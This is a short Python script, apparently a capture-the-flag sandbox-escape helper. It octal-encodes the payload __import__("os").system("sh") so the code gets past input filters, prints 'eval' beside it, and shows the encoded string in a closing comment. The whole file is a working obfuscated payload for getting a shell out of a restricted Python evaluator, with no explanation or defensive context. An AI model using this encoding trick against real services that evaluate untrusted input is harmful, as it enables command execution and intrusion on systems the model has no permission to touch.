def encode_octal(s: str):
    return "'" + ''.join(['\\{:03o}'.format(ord(c)) for c in s]) + "'"

print('eval')
print(encode_octal('__import__("os").system("sh")'))

# '\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\163\171\163\164\145\155\050\042\163\150\042\051'